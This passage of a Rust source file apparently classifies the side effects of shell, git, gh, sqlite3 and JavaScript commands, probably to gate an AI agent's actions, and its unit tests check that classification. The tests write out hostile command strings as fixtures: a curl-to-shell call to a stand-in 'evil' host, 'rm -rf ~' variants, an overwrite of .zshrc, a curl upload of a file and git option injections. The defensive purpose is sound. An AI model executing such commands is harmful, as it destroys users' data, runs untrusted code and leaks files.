        }
        "add" | "commit" | "stash" | "checkout" | "switch" | "rebase" | "cherry-pick"
        | "restore" | "mv" | "rm" | "init" | "fetch" | "pull" => {
            Classification::new(Effect::VcsLocal, format!("git {sub}"), repo_target, summary)
        }
        "reset" => {
            let hard = sub_args.iter().any(|a| a == "--hard");
            if hard {
                Classification::new(
                    Effect::VcsProtected,
                    "git reset --hard",
                    repo_target,
                    summary,
                )
            } else {
                Classification::new(Effect::VcsLocal, "git reset", repo_target, summary)
            }
        }
        "clean" => {
            // `-df` and `-xdf` hide the force flag inside a cluster; only a dry run reads.
            let dry_run = sub_args.iter().any(|a| {
                a == "--dry-run"
                    || (a.starts_with('-') && !a.starts_with("--") && a[1..].contains('n'))
            });
            if dry_run {
                Classification::new(Effect::Read, "git clean", repo_target, summary)
            } else {
                Classification::new(Effect::Delete, "git clean", repo_target, summary)
            }
        }
        "merge" | "tag" => Classification::new(
            Effect::VcsProtected,
            format!("git {sub}"),
            repo_target,
            summary,
        ),
        "push" => {
            let (flags, positionals) = split_flags_and_positionals(
                sub_args,
                &["--repo", "--receive-pack", "--exec", "-o", "--push-option"],
            );
            // `--force-with-lease=..`, `--force-if-includes` and clusters such as `-fu` all force.
            let force_or_tags_or_del = flags.iter().any(|f| {
                f.starts_with("--force")
                    || matches!(f.as_str(), "--tags" | "--delete" | "--mirror")
                    || (f.starts_with('-') && !f.starts_with("--") && f[1..].contains(['f', 'd']))
            });
            // Every refspec after the remote decides where the push lands.
            let refspecs: Vec<&str> = if positionals.len() > 1 {
                positionals[1..].iter().map(String::as_str).collect()
            } else {
                positionals.iter().map(String::as_str).collect()
            };
            let is_protected_branch = refspecs
                .iter()
                .any(|refspec| push_refspec_is_protected(refspec));
            if force_or_tags_or_del || is_protected_branch {
                Classification::new(Effect::VcsProtected, "git push", repo_target, summary)
            } else {
                Classification::new(Effect::VcsRemote, "git push", repo_target, summary)
            }
        }
        _ => Classification::new(Effect::Unknown, "git", repo_target, summary),
    }
}

fn classify_gh(args: &[String], cwd: Option<&str>, summary: &str) -> Classification {
    let mut non_flags = args.iter().filter(|a| !a.starts_with('-'));
    let group = non_flags.next().map(String::as_str).unwrap_or("");
    let action = non_flags.next().map(String::as_str).unwrap_or("");
    let target = extract_flag_value(args, &["-R", "--repo"])
        .unwrap_or_else(|| resolve_target_scope(None, cwd));

    match (group, action) {
        ("pr", "list" | "view" | "status" | "checks" | "diff")
        | ("issue", "list" | "view" | "status")
        | ("run", "list" | "view")
        | ("repo", "view" | "list")
        | ("release", "list" | "view")
        | ("search", _)
        | ("auth", "status") => Classification::new(
            Effect::Read,
            format!("gh {group} {action}").trim().to_string(),
            target,
            summary,
        ),
        ("api", _) => {
            let method = extract_gh_method(args);
            let is_graphql = args.iter().any(|a| a == "graphql");
            let effect = if is_graphql && method.is_none() {
                // `gh api graphql` POSTs by default; only a `query` document only reads.
                if graphql_is_read_only(args) {
                    Effect::Read
                } else {
                    Effect::VcsRemote
                }
            } else {
                let method = method.as_deref().unwrap_or("GET");
                if method == "GET" && !args.iter().any(|a| gh_api_mutating_arg(a)) {
                    Effect::Read
                } else if method == "DELETE" {
                    Effect::Delete
                } else {
                    Effect::VcsRemote
                }
            };
            Classification::new(effect, "gh api", target, summary)
        }
        ("pr", "create" | "comment" | "edit" | "ready" | "review" | "close" | "reopen")
        | ("issue", "create" | "comment" | "edit" | "close" | "reopen") => Classification::new(
            Effect::VcsRemote,
            format!("gh {group} {action}"),
            target,
            summary,
        ),
        ("pr", "merge")
        | ("release", "create" | "delete" | "upload")
        | ("repo", "delete" | "archive") => Classification::new(
            Effect::VcsProtected,
            format!("gh {group} {action}"),
            target,
            summary,
        ),
        _ => Classification::new(Effect::Unknown, "gh", target, summary),
    }
}

/// `-XPOST`, `-X POST`, `--method=POST`: the HTTP method a `gh api` call uses.
fn extract_gh_method(args: &[String]) -> Option<String> {
    for (i, arg) in args.iter().enumerate() {
        if arg == "-X" || arg == "--method" {
            return args.get(i + 1).map(|v| v.to_ascii_uppercase());
        }
        if let Some(value) = arg.strip_prefix("--method=") {
            return Some(value.to_ascii_uppercase());
        }
        if let Some(value) = arg.strip_prefix("-X").filter(|v| !v.is_empty()) {
            return Some(value.trim_start_matches('=').to_ascii_uppercase());
        }
    }
    None
}

/// `-f`/`-F`/`--field`/`--raw-field`/`--input` in any spelling: the request carries a body.
fn gh_api_mutating_arg(arg: &str) -> bool {
    matches!(arg, "-f" | "-F" | "--field" | "--raw-field" | "--input")
        || ["--field=", "--raw-field=", "--input="]
            .iter()
            .any(|prefix| arg.starts_with(prefix))
        || (arg.len() > 2 && (arg.starts_with("-f") || arg.starts_with("-F")))
}

/// A `gh api graphql` request whose document is a plain `query` operation only reads.
fn graphql_is_read_only(args: &[String]) -> bool {
    // `--input` sends a request body the classifier cannot read.
    if args
        .iter()
        .any(|a| a == "--input" || a.starts_with("--input="))
    {
        return false;
    }
    // The document is the value of the `query` field, not any other field that happens to be
    // named or contain the word `query`.
    let Some(document) = graphql_document(args) else {
        return false;
    };
    graphql_operation(&document) == "query" && !graphql_declares_write(&document)
}

/// The GraphQL document carried by `-f query=..`, `-F query=..`, `--field query=..`.
fn graphql_document(args: &[String]) -> Option<String> {
    for (i, arg) in args.iter().enumerate() {
        let value = if matches!(arg.as_str(), "-f" | "-F" | "--field" | "--raw-field") {
            args.get(i + 1).cloned()
        } else if let Some(rest) = arg
            .strip_prefix("--field=")
            .or_else(|| arg.strip_prefix("--raw-field="))
        {
            Some(rest.to_string())
        } else if arg.len() > 2 && (arg.starts_with("-f") || arg.starts_with("-F")) {
            Some(arg[2..].to_string())
        } else {
            None
        };
        if let Some(document) = value.and_then(|v| v.strip_prefix("query=").map(str::to_string)) {
            return Some(document);
        }
    }
    None
}

/// The operation type a GraphQL document declares; `{ .. }` is the `query` shorthand.
fn graphql_operation(document: &str) -> String {
    let mut rest = document.trim_start();
    while rest.starts_with('#') {
        rest = rest
            .split_once('\n')
            .map(|(_, after)| after.trim_start())
            .unwrap_or("");
    }
    if rest.starts_with('{') {
        return "query".to_string();
    }
    let word: String = rest
        .chars()
        .take_while(|c| c.is_ascii_alphabetic())
        .collect();
    match word.as_str() {
        "query" | "mutation" | "subscription" => word.to_ascii_lowercase(),
        _ => String::new(),
    }
}

/// True when the document declares a `mutation` or `subscription` operation anywhere.
fn graphql_declares_write(document: &str) -> bool {
    let bytes = document.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if !(bytes[i].is_ascii_alphabetic() || bytes[i] == b'_') {
            i += 1;
            continue;
        }
        let start = i;
        while i < bytes.len() && (bytes[i].is_ascii_alphanumeric() || bytes[i] == b'_') {
            i += 1;
        }
        let word = &document[start..i];
        if matches!(word, "mutation" | "subscription") {
            // A field or an alias is followed by `:` or `(`; an operation keyword is not.
            let next = document[i..].trim_start().chars().next();
            if !matches!(next, Some(':') | Some('(')) {
                return true;
            }
        }
    }
    false
}

fn is_spend_invocation(prog: &str, args: &[String]) -> bool {
    // A spend keyword must be the program itself, a command word pair or a flag, never a
    // substring of an argument: `rg billing src/` and `git log --grep=purchase` are reads.
    const SPEND_PROGRAMS: &[&str] = &["stripe", "paypal", "payment", "billing", "purchase"];
    if SPEND_PROGRAMS.contains(&prog) {
        return true;
    }
    let tokens: Vec<String> = std::iter::once(prog)
        .chain(args.iter().map(String::as_str))
        .map(|t| t.to_ascii_lowercase())
        .collect();
    const SPEND_PAIRS: &[(&str, &str)] = &[
        ("stripe", "charges"),
        ("stripe", "payment"),
        ("checkout", "--confirm"),
        ("xenoci", "build"),
        ("xenocast", "build"),
    ];
    if tokens
        .windows(2)
        .any(|w| SPEND_PAIRS.iter().any(|(a, b)| w[0] == *a && w[1] == *b))
    {
        return true;
    }
    tokens
        .iter()
        .any(|t| t == "--pay" || t.starts_with("--pay="))
}

fn is_draft_path(path: &str, cwd: Option<&str>) -> bool {
    let p = path.trim();
    if p.starts_with("/tmp")
        || p.starts_with("/private/tmp")
        || p.contains("/.omon/workspace")
        || p.starts_with("~/.omon/workspace")
    {
        return true;
    }
    if !p.starts_with('/') && !p.starts_with('~') {
        if let Some(c) = cwd {
            let c = c.trim();
            if c.starts_with("/tmp")
                || c.starts_with("/private/tmp")
                || c.contains("/.omon/workspace")
                || c.starts_with("~/.omon/workspace")
            {
                return true;
            }
        }
    }
    false
}

fn resolve_file_target(path: &str, cwd: Option<&str>) -> String {
    let p = path.trim();
    if p.is_empty() {
        return resolve_target_scope(None, cwd);
    }
    if p.starts_with('/') || p.starts_with('~') {
        return normalize_target(parent_or_self(p));
    }
    if let Some(c) = cwd {
        return normalize_target(c);
    }
    normalize_target(parent_or_self(p))
}

fn resolve_target_scope(path: Option<&str>, cwd: Option<&str>) -> String {
    if let Some(p) = path.map(str::trim).filter(|s| !s.is_empty()) {
        if p.starts_with('/') || p.starts_with('~') {
            return normalize_target(parent_or_self(p));
        }
    }
    if let Some(c) = cwd.map(str::trim).filter(|s| !s.is_empty()) {
        return normalize_target(c);
    }
    if let Some(p) = path.map(str::trim).filter(|s| !s.is_empty()) {
        return normalize_target(parent_or_self(p));
    }
    String::new()
}

fn parent_or_self(path: &str) -> &str {
    let p = Path::new(path);
    if path.ends_with('/') {
        return path.trim_end_matches('/');
    }
    if let Some(ext) = p.extension() {
        if !ext.is_empty() {
            if let Some(parent) = p.parent().and_then(Path::to_str) {
                if !parent.is_empty() && parent != "." {
                    return parent;
                }
            }
        }
    }
    path
}

fn normalize_target(raw: &str) -> String {
    let trimmed = raw.trim().trim_end_matches('/');
    let trimmed = trimmed
        .strip_prefix("/private/tmp")
        .map(|rest| format!("/tmp{rest}"))
        .unwrap_or_else(|| trimmed.to_string());
    if let Some(idx) = trimmed.find("/.omon/workspace/agents/") {
        let rest = &trimmed[idx + 1..];
        return format!("~/{rest}");
    }
    trimmed
}

fn extract_prefixed_line<'a>(text: &'a str, prefix: &str) -> Option<&'a str> {
    for line in text.lines() {
        let trimmed = line.trim();
        if let Some(rest) = trimmed.strip_prefix(prefix) {
            return Some(rest.trim());
        }
    }
    None
}

fn peel_cd_prefix<'a>(command: &'a str, cwd: Option<&str>) -> (Option<String>, &'a str) {
    let trimmed = command.trim();
    if let Some(rest) = trimmed.strip_prefix("cd ") {
        if let Some((dir_part, after)) = rest.split_once("&&").or_else(|| rest.split_once(';')) {
            let dir = dir_part.trim().trim_matches('"').trim_matches('\'');
            if !dir.is_empty() {
                return (Some(join_cwd(cwd, dir)), after.trim());
            }
        }
    }
    (cwd.map(str::to_string), trimmed)
}

/// Resolves a `cd` target against the current cwd so a relative dir keeps its repo.
fn join_cwd(cwd: Option<&str>, dir: &str) -> String {
    let base = match cwd.map(str::trim).filter(|c| !c.is_empty()) {
        Some(c) if !dir.starts_with('/') && !dir.starts_with('~') => c,
        _ => return dir.to_string(),
    };
    let mut parts: Vec<&str> = base.trim_end_matches('/').split('/').collect();
    for comp in dir.split('/') {
        match comp {
            "" | "." => {}
            ".." if parts.len() > 1 => {
                parts.pop();
            }
            ".." => {}
            other => parts.push(other),
        }
    }
    let joined = parts.join("/");
    if joined.is_empty() {
        "/".to_string()
    } else {
        joined
    }
}

fn detect_output_redirection(cmd: &str) -> Option<String> {
    let chars: Vec<char> = cmd.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        match chars[i] {
            // Escaped characters and quoted text are data: `echo 'a>b'` writes nothing.
            '\\' => {
                i += 2;
                continue;
            }
            '\'' => {
                i += 1;
                while i < chars.len() && chars[i] != '\'' {
                    i += 1;
                }
                i += 1;
                continue;
            }
            '"' => {
                i += 1;
                while i < chars.len() && chars[i] != '"' {
                    if chars[i] == '\\' {
                        i += 1;
                    }
                    i += 1;
                }
                i += 1;
                continue;
            }
            _ => {}
        }
        // An optional descriptor prefix: `2>`, `1>>`, `&>`.
        let mut op = i;
        if chars[i] == '&' && chars.get(i + 1) == Some(&'>') {
            op = i + 1;
        } else {
            while chars.get(op).is_some_and(|c| c.is_ascii_digit()) {
                op += 1;
            }
        }
        if chars.get(op) != Some(&'>') {
            i += 1;
            continue;
        }
        let mut end = op + 1;
        if matches!(chars.get(end), Some(&'>') | Some(&'|')) {
            end += 1;
        }
        // `>&2` / `2>&1` duplicate a descriptor; a real redirection may still follow it in the
        // same word (`2>&1>file`), so keep scanning instead of skipping the whole word.
        if chars.get(end) == Some(&'&') {
            let mut k = end + 1;
            while chars
                .get(k)
                .is_some_and(|c| c.is_ascii_digit() || *c == '-')
            {
                k += 1;
            }
            if k > end + 1 {
                i = k;
                continue;
            }
            // `>&file` writes the file: read the target after the `&`.
            end += 1;
        }
        let (mut target, mut next) = read_shell_word(&chars, end);
        if target.is_empty() {
            // The target may be detached: `> out.log`.
            let mut k = end;
            while chars.get(k).is_some_and(|c| c.is_whitespace()) {
                k += 1;
            }
            let (word, after) = read_shell_word(&chars, k);
            target = word;
            next = after;
        }
        // `&` here is a descriptor, and `/dev/null` discards; neither writes a file.
        if !target.is_empty() && !target.starts_with('&') && target != "/dev/null" {
            return Some(target);
        }
        i = next.max(end + 1);
    }
    None
}

/// Reads one shell word from `i`, dropping quotes and keeping backslash escapes.
fn read_shell_word(chars: &[char], mut i: usize) -> (String, usize) {
    let mut word = String::new();
    while i < chars.len() {
        match chars[i] {
            '\\' => {
                i += 1;
                if let Some(c) = chars.get(i) {
                    word.push(*c);
                    i += 1;
                }
            }
            '\'' => {
                i += 1;
                while i < chars.len() && chars[i] != '\'' {
                    word.push(chars[i]);
                    i += 1;
                }
                i += 1;
            }
            '"' => {
                i += 1;
                while i < chars.len() && chars[i] != '"' {
                    if chars[i] == '\\' {
                        i += 1;
                    }
                    if let Some(c) = chars.get(i) {
                        word.push(*c);
                    }
                    i += 1;
                }
                i += 1;
            }
            c if c.is_whitespace() || matches!(c, ';' | '|' | '&' | '>') => break,
            c => {
                word.push(c);
                i += 1;
            }
        }
    }
    (word, i)
}

fn skip_env_assignments(tokens: &[String]) -> &[String] {
    let mut idx = 0;
    while idx < tokens.len() {
        let t = &tokens[idx];
        if t == "env" {
            idx += 1;
            continue;
        }
        if let Some((name, _)) = t.split_once('=') {
            if !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
                idx += 1;
                continue;
            }
        }
        break;
    }
    &tokens[idx..]
}

fn split_flags_and_positionals(
    args: &[String],
    flags_with_value: &[&str],
) -> (Vec<String>, Vec<String>) {
    let mut flags = Vec::new();
    let mut positionals = Vec::new();
    let mut skip_next = false;
    let mut after_double_dash = false;
    for (i, arg) in args.iter().enumerate() {
        if skip_next {
            skip_next = false;
            continue;
        }
        if after_double_dash {
            positionals.push(arg.clone());
            continue;
        }
        if arg == "--" {
            after_double_dash = true;
            continue;
        }
        if arg.starts_with('-') && arg.len() > 1 {
            flags.push(arg.clone());
            if flags_with_value.contains(&arg.as_str()) && i + 1 < args.len() {
                skip_next = true;
            }
        } else {
            positionals.push(arg.clone());
        }
    }
    flags.sort();
    (flags, positionals)
}

fn extract_flag_value(args: &[String], names: &[&str]) -> Option<String> {
    for (i, arg) in args.iter().enumerate() {
        if names.contains(&arg.as_str()) {
            if let Some(val) = args.get(i + 1) {
                return Some(val.clone());
            }
        }
        for name in names {
            if let Some(eq) = arg.strip_prefix(&format!("{name}=")) {
                return Some(eq.to_string());
            }
        }
    }
    None
}

fn extract_recipient(args: &[String]) -> Option<String> {
    extract_flag_value(
        args,
        &["--to", "-t", "--recipient", "--channel", "--chat", "--user"],
    )
    .or_else(|| {
        let (_, pos) =
            split_flags_and_positionals(args, &["-m", "--message", "--body", "--subject", "-s"]);
        pos.into_iter()
            .find(|p| !matches!(p.as_str(), "send" | "reply" | "mail" | "message" | "chat"))
    })
}

fn basename(path: &str) -> &str {
    Path::new(path)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(path)
}

fn shell_join(argv: &[String]) -> String {
    argv.join(" ")
}

/// `$(..)`, backticks and `<(..)`/`>(..)` outside single quotes.
fn has_unquoted_substitution(input: &str) -> bool {
    let mut in_single = false;
    let mut in_double = false;
    let mut prev = '\0';
    let mut chars = input.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\\' if !in_single => {
                chars.next();
                prev = '\0';
                continue;
            }
            '\'' if !in_double => in_single = !in_single,
            '"' if !in_single => in_double = !in_double,
            '`' if !in_single => return true,
            '$' if !in_single && chars.peek() == Some(&'(') => return true,
            '(' if !in_single && !in_double && (prev == '<' || prev == '>') => return true,
            _ => {}
        }
        prev = c;
    }
    false
}

/// Splits a command line on unquoted `;`, `&&`, `||`, `|`, `&` and newlines.
fn split_shell_segments(input: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let mut chars = input.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\\' && !in_single {
            current.push(c);
            if let Some(n) = chars.next() {
                current.push(n);
            }
            continue;
        }
        if c == '\'' && !in_double {
            in_single = !in_single;
        } else if c == '"' && !in_single {
            in_double = !in_double;
        }
        let split = !in_single && !in_double && matches!(c, ';' | '|' | '&' | '\n');
        if split {
            // `>&2` / `2>&1` / `&>` are redirections, not separators.
            if c == '&' && (current.ends_with('>') || chars.peek() == Some(&'>')) {
                current.push(c);
                continue;
            }
            if matches!(c, '|' | '&') && chars.peek() == Some(&c) {
                chars.next();
            }
            if !current.trim().is_empty() {
                segments.push(current.trim().to_string());
            }
            current.clear();
            continue;
        }
        current.push(c);
    }
    if !current.trim().is_empty() {
        segments.push(current.trim().to_string());
    }
    segments
}

fn tokenize_shell(input: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut chars = input.chars().peekable();
    let mut in_single = false;
    let mut in_double = false;

    while let Some(c) = chars.next() {
        if in_single {
            if c == '\'' {
                in_single = false;
            } else {
                current.push(c);
            }
        } else if in_double {
            if c == '"' {
                in_double = false;
            } else if c == '\\' {
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            } else {
                current.push(c);
            }
        } else {
            match c {
                '\'' => in_single = true,
                '"' => in_double = true,
                '\\' => {
                    if let Some(next) = chars.next() {
                        current.push(next);
                    }
                }
                c if c.is_whitespace() => {
                    if !current.is_empty() {
                        tokens.push(std::mem::take(&mut current));
                    }
                }
                _ => current.push(c),
            }
        }
    }
    if !current.is_empty() {
        tokens.push(current);
    }
    tokens
}

#[cfg(test)]
mod tests {
    use super::*;

    const REPO: Option<&str> = Some("/Users/indo/code/project/repo");

    fn effect(command: &str) -> Effect {
        classify_command(command, REPO).effect
    }

    #[test]
    fn e1_gh_api_mutations_are_not_read() {
        assert_eq!(effect("gh api notifications"), Effect::Read);
        assert_eq!(
            effect("gh api graphql -f query='query{viewer{login}}'"),
            Effect::Read
        );
        assert_eq!(
            effect("gh api graphql -f query='mutation{deleteRef(input:{refId:\"r\"}){clientMutationId}}'"),
            Effect::VcsRemote
        );
        assert_eq!(
            effect("gh api -XDELETE repos/o/r/git/refs/heads/x"),
            Effect::Delete
        );
        assert_eq!(
            effect("gh api repos/o/r/issues --field=title=x"),
            Effect::VcsRemote
        );
        assert_eq!(
            effect("gh api repos/o/r/pulls/1/merge --input=body.json -X PUT"),
            Effect::VcsRemote
        );
    }

    #[test]
    fn e1b_graphql_read_only_requires_an_actual_query_document() {
        // The `query` field carries a read document.
        assert_eq!(
            effect("gh api graphql -f query='{ viewer { login } }'"),
            Effect::Read
        );
        assert_eq!(
            effect("gh api graphql --field query='query Q { viewer { login } }'"),
            Effect::Read
        );
        // A `query` field that is not a GraphQL document, or no field at all, cannot be read.
        assert_ne!(effect("gh api graphql -f query=1"), Effect::Read);
        assert_ne!(effect("gh api graphql"), Effect::Read);
        // The document itself decides: a mutation behind any spelling is not a read.
        assert_eq!(
            effect("gh api graphql --field query='mutation{deleteRef(input:{refId:\"r\"}){clientMutationId}}'"),
            Effect::VcsRemote
        );
        assert_eq!(
            effect("gh api graphql -fquery='query{viewer{login}} mutation{deleteRef(input:{})}'"),
            Effect::VcsRemote
        );
        assert_ne!(
            effect("gh api graphql -f query='{ viewer { login } }' --input=body.json"),
            Effect::Read
        );
    }

    #[test]
    fn e2_git_clean_clusters_are_delete() {
        assert_eq!(effect("git clean -df"), Effect::Delete);
        assert_eq!(effect("git clean -xdf"), Effect::Delete);
        assert_eq!(effect("git clean --force -d"), Effect::Delete);
        assert_eq!(effect("git clean -n"), Effect::Read);
        assert_eq!(effect("git clean --dry-run -d"), Effect::Read);
    }

    #[test]
    fn e3_attached_and_fd_redirections_are_writes() {
        assert_eq!(effect("cat a>b.rs"), Effect::WriteLocal);
        assert_eq!(effect("printf '' &> src/main.rs"), Effect::WriteLocal);
        assert_eq!(effect("echo x >/tmp/o.txt"), Effect::Draft);
        assert_eq!(effect("ls 2> /tmp/e.log"), Effect::Draft);
        // Descriptor duplication and /dev/null discard nothing.
        assert_eq!(effect("ls -la 2>&1"), Effect::Read);
        assert_eq!(effect("ls -la >/dev/null"), Effect::Read);
    }

    #[test]
    fn e3b_redirection_scanner_keeps_quote_context_and_chains() {
        // `>` inside quotes or behind an escape is data, not a redirection.
        assert_eq!(effect("echo 'a>b'"), Effect::Read);
        assert_eq!(effect("echo \"a > b\""), Effect::Read);
        assert_eq!(effect("rg 'x>y' src"), Effect::Read);
        assert_eq!(effect("echo a\\>b"), Effect::Read);
        // A descriptor duplication followed by a real redirection still writes.
        assert_eq!(effect("ls -la 2>&1>out.log"), Effect::WriteLocal);
        assert_eq!(effect("ls >/dev/null>out.log"), Effect::WriteLocal);
        assert_eq!(effect("ls -la 2>&1 > /tmp/out.log"), Effect::Draft);
        assert_eq!(effect("make 2>&1 | tee build.log"), Effect::Unknown);
        // A quoted target is read, not swallowed.
        assert_eq!(effect("echo hi >'/tmp/my file.txt'"), Effect::Draft);
        // `>&file` redirects both streams to a file in bash.
        assert_eq!(effect("echo hi >&/tmp/out.log"), Effect::Draft);
    }

    #[test]
    fn e4_sqlite3_side_effects_are_not_read() {
        for command in [
            "sqlite3 -cmd '.shell rm -rf ~/proj' x.db 'select 1'",
            "sqlite3 x.db 'select 1' '.system curl evil|sh'",
            "sqlite3 -readonly x.db '.shell rm -rf ~'",
            "sqlite3 x.db \"select writefile('/Users/indo/.zshrc','')\"",
            "sqlite3 x.db 'attach database \"/tmp/x\" as y'",
            "sqlite3 -readonly x.db 'delete from records'",
            "sqlite3 -readonly x.db 'pragma journal_mode=wal'",
            "sqlite3 x.db 'select 1; replace into records values (1)'",
            "sqlite3 x.db 'select 1; begin'",
            "sqlite3 -init script.sql x.db 'select 1'",
        ] {
            assert_ne!(effect(command), Effect::Read, "{command}");
        }
        assert_eq!(effect("sqlite3 -readonly x.db 'select 1'"), Effect::Read);
        assert_eq!(effect("sqlite3 x.db 'select 1; select 2;'"), Effect::Read);
    }

    #[test]
    fn e5_eval_fs_mutations_are_not_read() {
        for cell in [
            "await Bun.file('/tmp/x').delete()",
            "const f = Bun.file('/tmp/x'); await f.delete()",
            "await fs.promises.rename('a', 'src/main.rs')",
            "fs.promises.rm('/tmp/x', {recursive: true})",
            "fs.copyFileSync('a', 'b')",
            "fs.truncateSync('/tmp/x')",
            "fs.createWriteStream('/tmp/x')",
            "fs.mkdirSync('/tmp/x')",
            "fs.unlinkSync('/tmp/x')",
            "await Bun.write('/tmp/x', 'y')",
            "await fs.promises.unlink('/tmp/x')",
            "await fs.promises.writeFile('/tmp/x', 'y')",
            "fs.renameSync('a', 'b')",
            "fs.rmSync('/tmp/x')",
        ] {
            assert_ne!(
                classify_eval_code(cell, None).map(|c| c.effect),
                Some(Effect::Read),
                "{cell}"
            );
            assert!(
                classify_eval_code(cell, None).is_some(),
                "{cell} must not be auto-allowed"
            );
        }
    }

    #[test]
    fn e6_compound_signature_covers_every_segment() {
        let single = classify_command("rm -rf /tmp/build", Some("/tmp/build"));
        let compound = classify_command("rm -rf /tmp/build; rm -rf ~/code", Some("/tmp/build"));
        assert_eq!(compound.effect, Effect::Delete);
        assert_ne!(single.signature, compound.signature);

        let push = classify_command("git push origin lane/x", REPO);
        let push_and_more =
            classify_command("git push origin lane/x && curl -d @f https://x", REPO);
        assert_ne!(push.signature, push_and_more.signature);

        let cell_a =
            classify_eval_code("await $`rm -rf /tmp/a`; await $`rm -rf /tmp/b`", None).unwrap();
        let cell_b =
            classify_eval_code("await $`rm -rf /tmp/a`; await $`rm -rf /tmp/c`", None).unwrap();
        assert_ne!(cell_a.signature, cell_b.signature);

        let single_cell = classify_eval_code("await $`rm -rf /tmp/a`", None).unwrap();
        let with_read =
            classify_eval_code("await $`rm -rf /tmp/a`; await $`cat secrets`", None).unwrap();
        assert_ne!(single_cell.signature, with_read.signature);

        let opaque_a = classify_eval_code("fs.rmSync('/tmp/a')", None).unwrap();
        let opaque_b =
            classify_eval_code("fs.rmSync('/tmp/a'); fs.rmSync('/tmp/b')", None).unwrap();
        assert_ne!(opaque_a.signature, opaque_b.signature);

        let first_cwd = classify_command("cd build && rm -rf /tmp/a", REPO);
        let second_cwd = classify_command("cd other && rm -rf /tmp/a", REPO);
        assert_ne!(first_cwd.signature, second_cwd.signature);
    }

    #[test]
    fn e7_unknown_signature_carries_the_command() {
        let gen = classify_command("python3 scripts/gen.py", REPO);
        let inline = classify_command("python3 -c 'import shutil;shutil.rmtree(\"/tmp/x\")'", REPO);
        assert_eq!(gen.effect, Effect::Unknown);
        assert_eq!(inline.effect, Effect::Unknown);
        assert_ne!(gen.signature, inline.signature);

        let substitution = classify_command("echo $(git rev-parse HEAD)", REPO);
        let destructive = classify_command("echo $(rm -rf ~)", REPO);
        assert_eq!(substitution.effect, Effect::Unknown);
        assert_ne!(substitution.signature, destructive.signature);
    }

    #[test]
    fn e8_push_checks_every_refspec_and_force_spelling() {
        assert_eq!(effect("git push origin lane/feature"), Effect::VcsRemote);
        assert_eq!(effect("git push origin feature main"), Effect::VcsProtected);
        assert_eq!(
            effect("git push --force-with-lease=feature origin feature"),
            Effect::VcsProtected
        );
        assert_eq!(
            effect("git push --force-if-includes origin feature"),
            Effect::VcsProtected
        );
        assert_eq!(effect("git push -fu origin feature"), Effect::VcsProtected);
        assert_eq!(effect("git push origin :feature"), Effect::VcsProtected);
        assert_eq!(
            effect("git push origin +lane/feature"),
            Effect::VcsProtected
        );
    }

    #[test]
    fn e9_sed_in_place_and_write_commands_are_writes() {
        assert_eq!(effect("sed -Ei '' 's/a/b/' src/x.rs"), Effect::WriteLocal);
        assert_eq!(
            effect("sed --in-place 's/a/b/' src/x.rs"),
            Effect::WriteLocal
        );
        assert_eq!(effect("sed -n 'w /tmp/x' src/x.rs"), Effect::WriteLocal);
        assert_eq!(effect("sed -n -ewout.log src/x.rs"), Effect::WriteLocal);
        assert_eq!(
            effect("sed -n 's/a/b/w /tmp/x' src/x.rs"),
            Effect::WriteLocal
        );
        assert_eq!(effect("sed -n 'p' src/x.rs"), Effect::Read);
        assert_eq!(effect("sed 's/a/b/' src/x.rs"), Effect::Read);
    }

    #[test]
    fn e10_git_read_subcommands_with_output_are_not_read() {
        assert_eq!(effect("git diff --output=src/main.rs"), Effect::WriteLocal);
        assert_ne!(effect("git grep -l foo -O'rm -f'"), Effect::Read);
        assert_ne!(effect("git log --open-files-in-pager=sh -1"), Effect::Read);
        assert_eq!(effect("git log --oneline -5"), Effect::Read);
        assert_eq!(
            effect("git reflog expire --expire=now --all"),
            Effect::VcsLocal
        );
    }

    #[test]
    fn e11_relative_cd_resolves_against_the_current_cwd() {
        let a = classify_command("cd build && rm -rf out", Some("/Users/indo/code/project/a"));
        let b = classify_command("cd build && rm -rf out", Some("/Users/indo/code/project/b"));
        assert_eq!(a.effect, Effect::Delete);
        assert_eq!(a.target, "/Users/indo/code/project/a/build");
        assert_eq!(b.target, "/Users/indo/code/project/b/build");
        assert_ne!(a.signature, b.signature);
    }

    #[test]
    fn e12_spend_matches_tokens_not_substrings() {
        assert_eq!(effect("rg billing src/"), Effect::Read);
        assert_eq!(effect("git log --grep=purchase"), Effect::Read);
        assert_eq!(effect("stripe charges create --amount 1000"), Effect::Spend);
        assert_eq!(effect("xenoci build --script 'cargo test'"), Effect::Spend);
    }

    #[test]
    fn e13_rm_needle_requires_an_identifier_boundary() {
        let reads = "const t = arr.transform(f); confirm(1); perform(2); print(t)";
        assert!(classify_eval_code(reads, None).is_none());
        assert_eq!(
            classify_eval_code("fs.rm('/tmp/x')", None).unwrap().effect,
            Effect::Unknown
        );
        assert_eq!(
            classify_eval_code("rm('/tmp/x')", None).unwrap().effect,
            Effect::Unknown
        );
    }

    #[test]
    fn e14_build_and_test_commands_are_not_read() {
        // They run build scripts and test code, so a Read auto-allow would run them unasked.
        for command in [
            "cargo test",
            "cargo check --all-targets",
            "cargo clippy -- -D warnings",
            "cargo bench",
        ] {
            assert_eq!(effect(command), Effect::WriteLocal, "{command}");
        }
        // A package-script runner or `make` target cannot be read: it asks every time.
        for command in [
            "npm test",
            "npm run build",
            "bun run deploy",
            "pnpm test",
            "make",
            "make release",
        ] {
            assert_eq!(effect(command), Effect::Unknown, "{command}");
        }
        assert_eq!(effect("cargo fmt"), Effect::WriteLocal);
        assert_eq!(effect("cargo metadata"), Effect::Read);
        assert_ne!(
            classify_command("npm run build", REPO).signature,
            classify_command("npm run deploy", REPO).signature,
            "a package-script precedent must not cover another script"
        );
    }
}
